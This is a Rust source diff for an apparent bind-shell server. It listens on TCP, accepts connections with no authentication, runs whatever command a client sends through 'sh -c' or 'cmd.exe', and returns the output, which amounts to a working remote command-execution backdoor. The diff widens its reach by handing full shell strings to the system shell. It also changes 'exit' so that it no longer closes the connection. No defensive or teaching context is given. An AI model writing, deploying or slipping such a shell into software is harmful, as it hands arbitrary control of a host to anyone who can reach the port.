@@ -1,7 +1,12 @@
-use std::env::{args,set_current_dir};
+use std::env::{args, set_current_dir};
 use std::process;
 use tokio::io::{AsyncReadExt, AsyncWriteExt};
 use tokio::net::{TcpListener, TcpStream};
+
+#[cfg(target_os = "windows")]
+const SHELL: &str = "cmd.exe";
+#[cfg(not(target_os = "windows"))]
+const SHELL: &str = "sh";
 
 async fn read_command(conn: &mut TcpStream) -> String {
     let mut cmd = String::with_capacity(256);
@@ -12,40 +17,52 @@ async fn read_command(conn: &mut TcpStream) -> String {
     cmd
 }
 
-fn execute_send_command(args: Vec<&str>) -> Result<String, String> {
-    match args[0].trim() {
+fn execute_command(args: Vec<&str>) -> Result<String, String> {
+    match args[0].trim() { // check if special command
         "cd" => {
             if args.len() != 2 {
-                return Err("missing path".into())
+                return Err("missing path".into());
             }
             match set_current_dir(args[1]) {
-                Ok(_) => return Ok("changed dir with success".into()),
-                Err(_) => return Err("error when changing dir".into())
-            };
-        },
-        "exit" => return Err("exit".into()),
+                Ok(_) => Ok("changed dir with success".into()),
+                Err(_) => Err("error when changing dir".into()),
+            }
+        }
+        "exit" => Ok("exit".into()),
         "stop" => process::exit(0),
-        _ => {}
-    };
+        _ => {
+            let Ok(output) = process::Command::new(SHELL).args(["-c", &args.join(" ")]).output()
+            else { return Err(format!("{}: command error", args[0])) };
 
-    let Ok(output) = process::Command::new(args[0]).args(&args[1..]).output() else { return Err(format!("{}: command error", args[0])) };
-    let Ok(output) = String::from_utf8(output.stdout) else { return Err("command output error".into()) };
-    Ok(output)
+            let Ok(output) = String::from_utf8(output.stdout)
+            else { return Err("command output error".into()) };
+
+            Ok(output)
+        }
+    }
 }
 
 async fn handle_client(mut conn: TcpStream) {
     loop {
         let cmd = read_command(&mut conn).await;
-        if cmd.is_empty() { return }
+        if cmd.is_empty() {
+            return;
+        }
         log::info!("{cmd}");
         let args: Vec<&str> = cmd.split(' ').collect();
-        match execute_send_command(args) {
+        match execute_command(args) {
             Ok(m) => {
-                if conn.write_all(format!("{m}\0").as_bytes()).await.is_err() { return } else { continue }
-            },
+                if conn.write_all(format!("{m}\0").as_bytes()).await.is_err() {
+                    return;
+                } else {
+                    continue;
+                }
+            }
             Err(e) => {
                 log::error!("{e}");
-                if conn.write_all(format!("{e}\n\0").as_bytes()).await.is_err() || e == "exit" { return }
+                if conn.write_all(format!("{e}\n\0").as_bytes()).await.is_err() {
+                    return;
+                }
             }
         };
     }
@@ -69,9 +86,9 @@ async fn main() {
 
     loop {
         let Ok(client) = serv.accept().await else { continue };
-        tokio::spawn(async move { 
+        tokio::spawn(async move {
             log::info!("{} Appeared", client.1.to_string());
-            handle_client(client.0).await ;
+            handle_client(client.0).await;
             log::info!("{} is Gone", client.1.to_string());
         });
     }
